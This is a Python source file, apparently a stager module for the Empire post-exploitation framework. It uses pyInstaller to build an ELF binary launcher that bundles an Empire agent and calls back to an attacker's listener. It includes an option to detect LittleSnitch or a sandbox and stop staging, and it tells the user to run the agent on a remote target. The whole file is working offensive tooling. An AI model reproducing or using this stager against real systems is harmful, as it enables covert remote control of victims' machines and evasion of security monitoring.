from __future__ import print_function
from builtins import str
from builtins import object
from empire.server.common import helpers
import os

"""

Install steps...

- install pyInstaller
-- try: 


- copy into stagers directory
-- ./Empire/lib/stagers/

- kick off the empire agent on a remote target
-- /tmp/empire &

@TweekFawkes

"""


class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'pyInstaller Launcher',

            'Author': ['@TweekFawkes'],

            'Description': 'Generates an ELF binary payload launcher for Empire using pyInstaller.',

            'Comments': [
                'Needs to have pyInstaller setup on the system you are creating the stager on. For debian based operatins systems try the following command: apt-get -y install python-pip && pip install pyinstaller'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener': {
                'Description': 'Listener to generate stager for.',
                'Required': True,
                'Value': ''
            },
            'Language': {
                'Description': 'Language of the stager to generate.',
                'Required': True,
                'Value': 'python',
                'SuggestedValues': ['python'],
                'Strict': True
            },
            'BinaryFile': {
                'Description': 'File to output launcher to.',
                'Required': True,
                'Value': '/tmp/empire'
            },
            'SafeChecks': {
                'Description': 'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required': True,
                'Value': 'True',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'Base64': {
                'Description': 'Switch. Base64 encode the output. Defaults to False.',
                'Required': True,
                'Value': 'False',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'UserAgent': {
                'Description': 'User-agent string to use for the staging request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listener_name = self.options['Listener']['Value']
        base64 = self.options['Base64']['Value']
        user_agent = self.options['UserAgent']['Value']
        safe_checks = self.options['SafeChecks']['Value']
        binary_file_str = self.options['BinaryFile']['Value']

        encode = False
        if base64.lower() == "true":
            encode = True

        import subprocess
        output_str = subprocess.check_output(['which', 'pyinstaller'])
        if output_str == "":
            print(helpers.color("[!] Error pyInstaller is not installed"))
            print(helpers.color("[!] Try: apt-get -y install python-pip && pip install pyinstaller"))
            return ""
        else:
            # generate the launcher code
            launcher = self.mainMenu.stagers.generate_launcher(listenerName=listener_name, language=language,
                                                               encode=encode,
                                                               userAgent=user_agent, safeChecks=safe_checks)
            if launcher == "":
                print(helpers.color("[!] Error in launcher command generation."))
                return ""
            else:
                files_to_extract_imports_from_list = []

                stager_ffp_str = self.mainMenu.installPath + "/data/agent/stagers/http.py"
                files_to_extract_imports_from_list.append(stager_ffp_str)

                agent_ffp_str = self.mainMenu.installPath + "/data/agent/agent.py"
                files_to_extract_imports_from_list.append(agent_ffp_str)

                imports_list = []
                for FullFilePath in files_to_extract_imports_from_list:
                    with open(FullFilePath, 'r') as file:
                        for line in file:
                            line = line.strip()
                            if line.startswith('import '):
                                helpers.color(line)
                                imports_list.append(line)
                            elif line.startswith('from '):
                                helpers.color(line)
                                imports_list.append(line)

                imports_list.append('import trace')
                imports_list.append('import json')
                imports_list = list(set(imports_list))  # removing duplicate strings
                imports_str = "\n".join(imports_list)
                launcher = imports_str + "\n" + launcher

                with open(binary_file_str + ".py", "w") as text_file:
                    text_file.write("%s" % launcher)

                import time
                output_str = subprocess.check_output(
                    ['pyinstaller', '-y', '--clean', '--specpath', os.path.dirname(binary_file_str), '--distpath',
                     os.path.dirname(binary_file_str), '--workpath', '/tmp/' + str(time.time()) + '-build/', '--onefile',
                     binary_file_str + '.py'])
        return launcher
